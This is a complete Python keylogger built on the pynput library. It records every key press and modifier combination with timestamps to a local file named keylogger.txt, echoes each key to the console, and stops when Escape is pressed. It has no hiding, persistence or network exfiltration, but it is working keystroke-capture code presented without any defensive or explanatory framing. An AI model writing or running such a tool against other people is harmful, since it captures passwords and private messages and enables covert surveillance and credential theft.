import pynput
from pynput.keyboard import Key, Listener
import logging

# Define the location of the keylog
keylogger_filename = r"keylogger.txt"
# Define the format of the keylog
logging.basicConfig(filename=keylogger_filename, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Track the state of modifier keys
modifier_keys = {
    Key.ctrl_l: False,
    Key.ctrl_r: False,
    Key.shift: False,
    Key.shift_r: False,
    Key.alt: False
}

# Log the key that was pressed
def on_press(key):
    # Exit the program if escape key is pressed
    if key == Key.esc:
        return False

    # Check if key is a modifier and update its state
    if key in modifier_keys:
        modifier_keys[key] = True
    else:
        # Identify active modifiers
        active_modifiers = [str(k) for k, v in modifier_keys.items() if v]
        
        if active_modifiers:
            # If there are multiple modifiers, log them with the pressed key
            combination = " + ".join(active_modifiers) + f" + {key}"
            print(f"Combination pressed: {combination}")
            logging.info(combination)
        else:
            # Single key (non-modifier) press
            print(f"Single key pressed: {key}")
            logging.info(str(key))

        # Reset modifiers after each key press
        reset_modifiers()

def reset_modifiers():
    for key in modifier_keys:
        modifier_keys[key] = False

# Listen for keyboard events and call on_press whenever a key is pressed
with Listener(on_press=on_press) as listener:
    # Keep the program running until it is stopped
    listener.join()
